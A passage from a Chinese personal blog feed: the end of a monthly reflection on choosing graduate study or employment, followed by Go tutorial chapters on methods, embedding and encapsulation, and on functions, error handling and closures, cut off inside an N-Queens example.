id="关于读研"><a class="markdownIt-Anchor" href="#关于读研"></a> 关于读研</h3><p>这个月一直在纠结焦虑是读研还是直接就业。去年的绩点并不理想，先暂且不考虑保研。比起刷题看课卷数学，我更愿意学习一些工程知识。但是考虑到将来的职业规划，我又在担心本科学历是否会成为我之后的掣肘。</p><p>所以我去找了一位老师攀谈。老师很年轻，可以说是年少有为，25岁回国就来学校上班了，少走了很多弯路，也很愿意去指导学生。他的意见其实比较谨慎，还是说要根据个人情况决定。不过他也给出了考研的蓝图，大概明年二月份就可以开始准备了。十个月的时间准备考研足矣，如果十个月的时间考不上研究生，那么他认为不如再考虑考虑自己是否适合读研这条路。也就是说，我还有半年的“缓刑”。毕竟大三上还在上操作系统呢，这也意味着我还可以再多钻研半年技术。</p><h2 id="随便写点"><a class="markdownIt-Anchor" href="#随便写点"></a> 随便写点</h2><p>五月份的总结到此结束。在写完的那一刻，我才对那个已经逝去的五月有了一点大概的印象。明明忙碌的三十天才刚过去，现在却只剩下了寥寥一两千字，有一种荒诞的不真实感。</p><p>其实仔细对比一下前面的总结，我在五月份的工作量反而减少了。一方面是由于学期进入到后期课业压力日益增大，另一方面，尽管我不想承认，我也有相当一部分时间在“说漂亮话”吧。明明雄心壮志的定下了明天的规划，第二天的工作却直到中午才姗姗来迟。我看似在忙碌的时间很多，实际上做成的事情却很少。也许，我打下这些字的初衷之一，也只不过是为了欺骗自己，今天也很努力了，然后如释重负地坐回椅子上开始兴致勃勃地刷视频。</p><p>我知道这是我的个人总结，想必也不会有多少人来看，愿意听我发牢骚的人想必也是在实际生活中愿意关注我的人，和他们开诚布公的聊聊自己我觉得没什么大问题。所以属于我的缺点，我也会尽可能的罗列出来，然后在新的一个月里，努力的debug，始终让自己处于一个相对稳定的状态。</p><p>最近我也开始听一些古典音乐。一开始还是在B站上听A叔改编的一些动漫钢琴曲，后来刷到了郎朗弹《钟》的视频，看完后这首曲子在脑子里回响了一天。于是就开始有意识的去找一些入门的古典音乐听听。比如莫扎特的土耳其进行曲、肖邦的夜曲、勃拉姆斯和舒伯特的摇篮曲、贝多芬的月光、致爱丽丝，还有卡门序曲、匈牙利舞曲第五首这些“烂大街”的曲子，我都挺喜欢的。</p><p>是听坦白来说我做不到像专业的人那样去欣赏，我只是单纯的觉得有些音乐很好听。当然，也有一些想要向阳春白雪靠拢的附庸风雅的念头。我一直致力于提高自己，如何让自己走得更远。但是实际上要做到这件事是很困难的一件事，所以很容易喊着喊着就沦落成了一句口号，除了满足自己的虚荣心和填平自己摆烂的愧疚感外毫无作用。就像那些谁也听不懂的古典音乐，对我来说除了好听一无是处。</p><p>但是音乐只要用心聆听下去，总会有产生共鸣的那一天。踏踏实实，脚踏实地的去学习和挑战自己，人也一定会有所成长，或者说除了持之以恒的、问心无愧的实干，别无他法。更何况，我也没有退路可言。我相信，即使是现在这个一无所长的我，将来也会有一天，能够听一场正式的音乐会吧。</p><p>好了，不管怎么说，今天是儿童节。</p><p>先祝我儿童节快乐吧：）。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/8981cb99c62b4476c46ad281521a5e11.jpeg" alt="8981cb99c62b4476c46ad281521a5e11" /></p>]]></content>
      
      
      <categories>
          
          <category> 月度总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go修炼手册——方法</title>
      <link href="/posts/87481f6e6c8c/"/>
      <url>/posts/87481f6e6c8c/</url>
      
        <content type="html"><![CDATA[<h2 id="方法"><a class="markdownIt-Anchor" href="#方法"></a> 方法</h2><p>方法是面向对象编程（OOP）的重要一环。从我们的理解来讲，一个对象其实也就是一个简单的值或者一个变量，在这个对象中会包含一些方法，而一个方法则是一个和特殊类型关联的函数。一个面向对象的程序会用方法来表达其属性和对应的操作，这样使用这个对象的用户就不需要直接去操作对象，而是借助方法来做这些事情。</p><p>本章会介绍OOP编程中的两个关键点：封装和组合。</p><h3 id="方法声明"><a class="markdownIt-Anchor" href="#方法声明"></a> 方法声明</h3><p>在函数声明时，在其名字之前放上一个变量，即是一个方法。这个附加的参数会将该函数附加到这种类型上，即相当于为这种类型定义了一个独占的方法。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// traditional function</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Distance</span><span class="params">(p, q Point)</span></span> <span class="type">float64</span> &#123;</span><br><span class="line"> <span class="keyword">return</span> math.Hypot(q.X-p.X, q.Y-p.Y)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// same thing, but as a method of the Point type</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Point)</span></span> Distance(q Point) <span class="type">float64</span> &#123;</span><br><span class="line"> <span class="keyword">return</span> math.Hypot(q.X-p.X, q.Y-p.Y)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在Go语言中，我们并不会像其它语言那样用this或者self作为接收器；我们可以任意的选择接收器的名字。</p><p>比如在Python中定义方法的话，首先得声明一个类。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">P</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.x = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">self</span>):</span><br><span class="line">        self.x += <span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="基于指针对象的方法"><a class="markdownIt-Anchor" href="#基于指针对象的方法"></a> 基于指针对象的方法</h3><p>当调用一个函数时，会对其每一个参数值进行拷贝，如果一个函数需要更新一个变量，或者函数的其中一个参数实在太大我们希望能够避免进行这种默认的拷贝，这种情况下我们就需要用到指针了。对应到我们这里用来更新接收器的对象的方法，当这个接受者变量本身比较大时，我们就可以用其指针而不是对象来声明方法。</p><p>比如：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Point)</span></span> ScaleBy(factor <span class="type">float64</span>) &#123;</span><br><span class="line"> p.X *= factor</span><br><span class="line"> p.Y *= factor</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在调用这个方法时，可以通过以下的方式：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">r := &amp;Point&#123;<span class="number">1</span>,<span class="number">2</span>&#125;</span><br><span class="line">r.ScaleBy(<span class="number">2</span>)</span><br><span class="line">fmt.Println(*r) <span class="comment">// &quot;&#123;2, 4&#125;&quot;</span></span><br><span class="line"><span class="comment">//----</span></span><br><span class="line">p := Point&#123;<span class="number">1</span>, <span class="number">2</span>&#125;</span><br><span class="line">pptr := &amp;p</span><br><span class="line">pptr.ScaleBy(<span class="number">2</span>)</span><br><span class="line">fmt.Println(p) <span class="comment">// &quot;&#123;2, 4&#125;&quot;</span></span><br><span class="line"><span class="comment">//----</span></span><br><span class="line">p := Point&#123;<span class="number">1</span>, <span class="number">2</span>&#125;</span><br><span class="line">(&amp;p).ScaleBy(<span class="number">2</span>)</span><br><span class="line">fmt.Println(p) <span class="comment">// &quot;&#123;2, 4&#125;&quot;</span></span><br><span class="line"><span class="comment">//----</span></span><br></pre></td></tr></table></figure><p>后两种方法有些笨拙，但实际上我们可以简化这个步骤。Go语言的编译器会隐式的帮你去转换类型。比如一个类型为Point的p变量，如果方法的接收器要求是一个Point指针，可以用简短写法如下：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">P.ScaleBy(<span class="number">2</span>)</span><br><span class="line"><span class="comment">//等价于(&amp;P).ScaleBy</span></span><br></pre></td></tr></table></figure><p>同样的，对于指针类型的变量调用接收器为类型本身的方法时编译器也会做自动的类型转换。</p><p>只有类型（Point）和指向他们的指针 (*Point) ，才可能是出现在接收器声明里的两种接收器。此外，为了避免歧义，在声明方法时，如果一个类型名本身是一个指针的话，是不允许其出现在接收器中的。</p><p>可以总结为如下两点：</p><blockquote><ol><li><p>不管你的method的receiver是指针类型还是非指针类型，都是可以通过指针/非指针类型进行调用的，编译器会帮你做类型转换。</p></li><li><p>在声明一个method的receiver该是指针还是非指针类型时，你需要考虑两方面的因素，第一方面是这个对象本身是不是特别大，如果声明为非指针变量时，调用会产生一次拷贝；第二方面是如果你用指针类型作为receiver，那么你一定要注意，这种指针类型指向的始终是一块内存地址，就算你对其进行了拷贝。熟悉C或者C++的人这里应该很快能明白。</p></li></ol></blockquote><h3 id="通过嵌入结构体来扩展类型"><a class="markdownIt-Anchor" href="#通过嵌入结构体来扩展类型"></a> 通过嵌入结构体来扩展类型</h3><p>假如我们拥有如下代码：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;image/color&quot;</span></span><br><span class="line"><span class="keyword">type</span> Point <span class="keyword">struct</span>&#123; X, Y <span class="type">float64</span> &#125;</span><br><span class="line"><span class="keyword">type</span> ColoredPoint <span class="keyword">struct</span> &#123;</span><br><span class="line"> Point</span><br><span class="line">  Color color.RGBA</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这段代码中，我们定义了一个内嵌结构体<code>ColoredPoint</code>，它包含<code>Point</code>类型的一切字段，并且自己又定义了一些额外的成员。</p><p>在<code>ColoredPoint</code>类型中，我们可以直接使用<code>Point</code>类型的方法，而无需指出<code>Point</code>。即使在<code>ColoredPoint</code>没有声明这样的方法。</p><p>用这种方式，内嵌可以使我们定义字段特别多的复杂类型，我们可以将字段先按小类型分组，然后定义小类型的方法，之后再把它们<strong>组合</strong>起来。</p><blockquote><p>读者如果对基于类来实现面向对象的语言比较熟悉的话，可能会倾向于将Point看作一个基类，而ColoredPoint看作其子类或者继承类，或者将ColoredPoint看作&quot;is a&quot; Point类型。但这是错误的理解。请注意上面例子中对Distance方法的调用。Distance有一个参数是Point类型，但q并不是一个Point类，所以尽管q有着Point这个内嵌类型，我们也必须要显式地选择它。</p></blockquote><p>也即你需要在调用<code>Point</code>类的方法前显示的指定<code>Point</code>。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">p.Distance(q) <span class="comment">// error</span></span><br><span class="line">p.Point.Distance(q)<span class="comment">// right</span></span><br></pre></td></tr></table></figure><p>当Point.Distance被第一个包装方法调用时，它的接收器值是p.Point，而不是p。</p><p>在类型中内嵌的匿名字段也可能是一个命名类型的指针，这种情况下字段和方法会被间接地引入到当前的类型中。这种间接关系允许我们共享通用的结构。</p><p>一个struct类型也可能会有多个匿名字段。这样他就获得了匿名字段中定义的所有方法。</p><h3 id="方法值和方法表达式"><a class="markdownIt-Anchor" href="#方法值和方法表达式"></a> 方法值和方法表达式</h3><p>我们经常选择一个方法，并且在同一个表达式里执行，比如常见的p.Distance()形式，实际上将其分成两步来执行也是可能的。</p><blockquote><p>p.Distance叫作“选择器”，选择器会返回一个方法“值”-&gt;一个将方法（Point.Distance）绑定到特定接收器变量的函数。这个函数可以不通过指定其接收器即可被调用；即调用时不需要指定接收器（译注：因为已经在前文中指定过了），只要传入函数的参数即可</p></blockquote><p>也就是可以通过下面这种方法来调用方法，来分离其与变量本身。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">scaleP := p.ScaleBy <span class="comment">// method value</span></span><br><span class="line">scaleP(<span class="number">2</span>) <span class="comment">// p becomes (2, 4)</span></span><br><span class="line"><span class="comment">//等价于下面这种用法</span></span><br><span class="line">res=p.ScaleBy(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>在一个包的API需要一个函数值、且调用方希望操作的是某一个绑定了对象的方法的话，方法“值”会非常实用.</p><p>其实就是把一个方法作为“值”去传递，这与C语言中传递函数指针的概念类似，但Go语言的方法值提供了类型安全和更简洁的语法。</p><h3 id="封装"><a class="markdownIt-Anchor" href="#封装"></a> 封装</h3><p>一个对象的变量或者方法如果对调用方是不可见的话，一般就被定义为“封装”。封装有时候也被叫做信息隐藏，同时也是面向对象编程最关键的一个方面。</p><p>Go语言只有一种控制可见性的手段：大写首字母的标识符会从定义它们的包中被导出，小写字母的则不会。这种限制包内成员的方式同样适用于struct或者一个类型的方法。因而如果我们想要封装一个对象，我们必须将其定义为一个struct</p><p>这种基于名字的手段使得在语言中最小的封装单元是package，而不是像其它语言一样的类型。一个struct类型的字段对同一个包的所有代码都有可见性，无论你的代码是写在一个函数还是一个方法里</p><p>封装提供了三方面的优点。首先，因为调用方不能直接修改对象的变量值，其只需要关注少量的语句并且只要弄懂少量变量的可能的值即可。</p><p>第二，隐藏实现的细节，可以防止调用方依赖那些可能变化的具体实现，这样使设计包的程序员在不破坏对外的api情况下能得到更大的自由</p><p>封装的第三个优点也是最重要的优点，是阻止了外部调用方对对象内部的值任意地进行修改。因为对象内部变量只可以被同一个包内的函数修改，所以包的作者可以让这些函数确保对象内部的一些值的不变性。</p><blockquote><p>只用来访问或修改内部变量的函数被称为setter或者getter，例子如下，比如log包里的Logger类型对应的一些函数。在命名一个getter方法时，我们通常会省略掉前面的Get前缀。这种简洁上的偏好也可以推广到各种类型的前缀比如Fetch，Find或者Lookup。</p></blockquote><p>Go的编码风格不禁止直接导出字段。当然，一旦进行了导出，就没有办法在保证API兼容的情况下去除对其的导出，所以在一开始的选择一定要经过深思熟虑并且要考虑到包内部的一些不变量的保证，未来可能的变化，以及调用方的代码质量是否会因为包的一点修改而变差。</p><p>所以最好还是用setter或者getter等专门的方法去获取变量，方便维护。</p><p>封装并不总是理想的。 虽然封装在有些情况是必要的，但有时候我们也需要暴露一些内部内容，比如：time.Duration将其表现暴露为一个int64数字的纳秒，使得我们可以用一般的数值操作来对时间进行对比，甚至可以定义这种类型的常量</p><h3 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h3><p>在这章中，我们学到了如何将方法与命名类型进行组合，并且知道了如何调用这些方法。尽管方法对于OOP编程来说至关重要，但他们只是OOP编程里的半边天。为了完成OOP，我们还需要接口。Go里的接口会在下一章中介绍。</p><hr /><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/2c28c545aca49c9b356d3b8ae2f935cf.jpeg" alt="" /></p>]]></content>
      
      
      <categories>
          
          <category> Go!Go!Go! </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go修炼手册——函数</title>
      <link href="/posts/4cefd0c437e2/"/>
      <url>/posts/4cefd0c437e2/</url>
      
        <content type="html"><![CDATA[<h2 id="函数"><a class="markdownIt-Anchor" href="#函数"></a> 函数</h2><p>我们已经见过许多函数了。本章借助于《Go语言圣经》上的资料，以一个网络爬虫为帮助，去理解Go语言中的函数特性。</p><h3 id="函数声明"><a class="markdownIt-Anchor" href="#函数声明"></a> 函数声明</h3><p>函数声明包括函数名、形式参数列表、返回值列表（可省略）以及函数体。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">name</span><span class="params">(parameter-list)</span></span> (result-list) &#123;</span><br><span class="line">body</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果函数没有返回值，可以省略返回值列表。如果有多个返回值，需要声明在返回值列表中。Go可以返回多个值，这与其他语言很不一样。</p><p>在参数列表中，如果想强调某个参数未使用，可以用<code>_</code>来表示。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">first</span><span class="params">(x <span class="type">int</span>,_ <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;<span class="keyword">return</span> x&#125;</span><br></pre></td></tr></table></figure><p>函数的类型被称为函数的<strong>签名</strong>。如果两个函数形式参数列表和返回值列表中的变量类型一一对应，那么这两个函数被认为有相同的类型或签名。</p><p>实参通过值的方式传递，因此函数的形参是实参的拷贝。对形参进行修改不会影响实参。但是，如果实参包括引用类型，如指针，slice(切片)、map、function、channel等类型，实参可能会由于函数的间接引用被修改。</p><h3 id="递归"><a class="markdownIt-Anchor" href="#递归"></a> 递归</h3><p>大部分编程语言使用固定大小的函数调用栈，常见的大小从64KB到2MB不等。固定大小栈会限制递归的深度，当你用递归处理大量数据时，需要避免栈溢出；除此之外，还会导致安全性问题。与此相反，Go语言使用可变栈，栈的大小按需增加（初始时很小）。这使得我们使用递归时不必考虑溢出和安全问题。</p><h3 id="多返回值"><a class="markdownIt-Anchor" href="#多返回值"></a> 多返回值</h3><p>在Go语言中，函数可以返回多个值。常见的用法即返回一个函数正常调用的返回值和错误信息<code>err</code>指示函数是否被正常调用。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">findLinks</span><span class="params">(url <span class="type">string</span>)</span></span> ([]<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">     resp, err := http.Get(url)</span><br><span class="line">     <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">if</span> resp.StatusCode != http.StatusOK &#123;</span><br><span class="line">         resp.Body.Close()</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;getting %s: %s&quot;</span>, url, resp.Status)</span><br><span class="line">     &#125;</span><br><span class="line">     doc, err := html.Parse(resp.Body)</span><br><span class="line">     resp.Body.Close()</span><br><span class="line">     <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;parsing %s as HTML: %v&quot;</span>, url, err)</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> visit(<span class="literal">nil</span>, doc), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>虽然Go的垃圾回收机制会回收不被使用的内存，但是这不包括操作系统层面的资源，比如打开的文件、网络连接。因此我们必须显式的释放这些资源。</p></blockquote><p>如果某个值不被使用，可以将其分配给blank identifier<code>_</code>。</p><p>如果一个函数所有的返回值都有显式的变量名，那么该函数的return语句可以省略操作数。这称之为<strong>bare return</strong>。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// CountWordsAndImages does an HTTP GET request for the HTML</span></span><br><span class="line"><span class="comment">// document url and returns the number of words and images in it.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CountWordsAndImages</span><span class="params">(url <span class="type">string</span>)</span></span> (words, images <span class="type">int</span>, err <span class="type">error</span>) &#123;</span><br><span class="line">     resp, err := http.Get(url)</span><br><span class="line">     <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">     <span class="keyword">return</span></span><br><span class="line">     &#125;</span><br><span class="line">     doc, err := html.Parse(resp.Body)</span><br><span class="line">     resp.Body.Close()</span><br><span class="line">     <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">         err = fmt.Errorf(<span class="string">&quot;parsing HTML: %s&quot;</span>, err)</span><br><span class="line">         <span class="keyword">return</span></span><br><span class="line">     &#125;</span><br><span class="line">     words, images = countWordsAndImages(doc)</span><br><span class="line">     <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">countWordsAndImages</span><span class="params">(n *html.Node)</span></span> (words, images <span class="type">int</span>) &#123; <span class="comment">/* ... */</span> &#125;</span><br></pre></td></tr></table></figure><p><code>CountWordsAndImages</code>函数的<code>return</code>等价于。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> words, images, err</span><br></pre></td></tr></table></figure><p>当一个函数有多处return语句以及许多返回值时，bare return 可以减少代码的重复，但是使得代码难以被理解。不宜过度使用bare return。</p><h3 id="错误"><a class="markdownIt-Anchor" href="#错误"></a> 错误</h3><p>在Go的错误处理中，错误是软件包API和应用程序用户界面的一个重要组成部分，程序运行失败仅被认为是几个预期的结果之一</p><p>在Go中，函数运行失败时会返回错误信息，这些错误信息被认为是一种预期的值而非异常（exception），这使得Go有别于那些将函数运行失败看作是异常的语言。虽然Go有各种异常机制，但这些机制仅被使用在处理那些未被预料到的错误，即bug，而不是那些在健壮程序中应该被避免的程序错误。</p><p>Go这样设计的原因是由于对于某个应该在控制流程中处理的错误而言，将这个错误以异常的形式抛出会混乱对错误的描述，这通常会导致一些糟糕的后果。当某个程序错误被当作异常处理后，这个错误会将堆栈跟踪信息返回给终端用户，这些信息复杂且无用，无法帮助定位错误。</p><p>（这可太甜蜜的真实了）</p><p>正因此，Go使用控制流机制（如if和return）处理错误，这使得编码人员能更多的关注错误处理。</p><p>（但是冗杂的一批）</p><h4 id="错误处理机制"><a class="markdownIt-Anchor" href="#错误处理机制"></a> 错误处理机制</h4><p>最常用的方法是传播错误，这意味着函数中某个子程序的失败，会变成该函数的失败。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">findLinks</span><span class="params">(url <span class="type">string</span>)</span></span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    resp, err := http.Get(url)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fmt.Errorf函数使用fmt.Sprintf格式化错误信息并返回。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">doc, err := html.Parse(resp.Body)</span><br><span class="line">resp.Body.Close()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;parsing %s as HTML: %v&quot;</span>, url,err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二种策略是：如果错误的发生是偶然性的，或由不可预知的问题导致的。一个明智的选择是重新尝试失败的操作。在重试时，我们需要限制重试的时间间隔或重试的次数，防止无限制的重试。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// WaitForServer attempts to contact the server of a URL.</span></span><br><span class="line"><span class="comment">// It tries for one minute using exponential back-off.</span></span><br><span class="line"><span class="comment">// It reports an error if all attempts fail.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WaitForServer</span><span class="params">(url <span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> timeout = <span class="number">1</span> * time.Minute</span><br><span class="line">    deadline := time.Now().Add(timeout)</span><br><span class="line">    <span class="keyword">for</span> tries := <span class="number">0</span>; time.Now().Before(deadline); tries++ &#123;</span><br><span class="line">        _, err := http.Head(url)</span><br><span class="line">        <span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nil</span> <span class="comment">// success</span></span><br><span class="line">        &#125;</span><br><span class="line">        log.Printf(<span class="string">&quot;server not responding (%s);retrying…&quot;</span>, err)</span><br><span class="line">        time.Sleep(time.Second &lt;&lt; <span class="type">uint</span>(tries)) <span class="comment">// exponential back-off</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;server %s failed to respond after %s&quot;</span>, url, timeout)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果错误发生后，程序无法继续运行，我们就可以采用第三种策略：输出错误信息并结束程序。需要注意的是，这种策略只应在main中执行。对库函数而言，应仅向上传播错误，除非该错误意味着程序内部包含不一致性，即遇到了bug，才能在库函数中结束程序。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// (In function main.)</span></span><br><span class="line"><span class="keyword">if</span> err := WaitForServer(url); err != <span class="literal">nil</span> &#123;</span><br><span class="line">     fmt.Fprintf(os.Stderr, <span class="string">&quot;Site is down: %v\n&quot;</span>, err)</span><br><span class="line">     os.Exit(<span class="number">1</span>) </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//or replace with code below to achieve the same effect</span></span><br><span class="line"><span class="keyword">if</span> err := WaitForServer(url); err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Fatalf(<span class="string">&quot;Site is down: %v\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第四种策略：有时，我们只需要输出错误信息就足够了，不需要中断程序的运行。我们可以通过log包提供函数，或者标准错误流输出错误信息。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> err := Ping(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;ping failed: %v; networking disabled&quot;</span>,err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := Ping(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Fprintf(os.Stderr, <span class="string">&quot;ping failed: %v; networking disabled\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第五种，也是最后一种策略：我们可以直接忽略掉错误。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">dir, err := ioutil.TempDir(<span class="string">&quot;&quot;</span>, <span class="string">&quot;scratch&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;failed to create temp dir: %v&quot;</span>,err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...use temp dir…</span></span><br><span class="line">os.RemoveAll(dir) <span class="comment">// ignore errors; $TMPDIR is cleaned periodically</span></span><br></pre></td></tr></table></figure><p>在Go中，错误处理有一套独特的编码风格。检查某个子函数是否失败后，我们通常将处理失败的逻辑代码放在处理成功的代码之前。如果某个错误会导致函数返回，那么成功时的逻辑代码不应放在else语句块中，而应直接放在函数体中。Go中大部分函数的代码结构几乎相同，首先是一系列的初始检查，防止错误发生，之后是函数的实际逻辑。（也导致令人诟病的“调用一个函数要写四行”的麻烦）</p><h3 id="函数值"><a class="markdownIt-Anchor" href="#函数值"></a> 函数值</h3><p>在Go中，函数被看作第一类值（first-class values）：函数像其他值一样，拥有类型，可以被赋值给其他变量，传递给函数，从函数返回。对函数值（function value）的调用类似函数调用。</p><h3 id="匿名函数"><a class="markdownIt-Anchor" href="#匿名函数"></a> 匿名函数</h3><p>拥有函数名的函数只能在包级语法块中被声明，通过函数字面量（function literal），我们可绕过这一限制，在任何表达式中表示一个函数值。函数字面量允许我们在使用函数时，再定义它。</p><p>更为重要的是，通过这种方式定义的函数可以访问完整的词法环境（lexical environment），这意味着在函数中定义的内部函数可以引用该函数的变量。如下例所示：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">solveNQueens</span><span class="params">(n <span class="type">int</span>)</span></span> [][]<span class="type">string</span> &#123;</span><br><span class="line"><span class="keyword">var</span> res [][]<span class="type">string</span></span><br><span class="line"><span class="keyword">var</span> board [][]<span class="type">byte</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line">board = <span class="built_in">append</span>(board, <span class="built_in">make</span>([]<span class="type">byte</span>, n))</span><br><span class="line"><span class="keyword">for</span> j := <span class="number">0</span>; j &lt; n; j++ &#123;</span><br><span class="line">board[i][j] = <span class="string">&#x27;.&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="comment">//初始化棋盘为全&#x27;.&#x27;，即空</span></span><br><span class="line"><span class="keyword">var</span> backtrack <span class="function"><span class="keyword">func</span><span class="params">(row <span class="type">int</span>)</span></span> <span class="comment">//定义匿名函数</span></span><br><span class="line">backtrack = <span class="function"><span class="keyword">func</span><span class="params">(row <span class="type">int</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> row == n &#123; <span class="comment">//结束条件</span></span><br><span class="line"><span class="keyword">var</span> tmp []<span class="type">string</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line">tmp = <span class="built_in">append</span>(tmp, <span class="type">string</span>(board[i]))</span><br><span class="line">&#125;</span><br><span class="line">res = <span class="built_in">append</span>(res, tmp) <span class="comment">//找到一个解，将解加入结果集</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> col := <span class="number">0</span>; col &lt; n; col++ &#123;</span><br><span class="line"><span class="keyword">if</span> !isValid(board, row, col) &#123; <span class="comment">//剪枝</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">board[row][col] = <span class="string">&#x27;Q&#x27;</span> <span class="comment">//进行选择</span></span><br><span class="line">backtrack(row + <span class="number">1</span>)    <span class="comment">//递归</span></span><br><span class="line">board[row][col] = <span class="string">&#x27;.&#x27;</span> <span class="comment">//撤销选择</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">backtrack(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> res</span><br><span 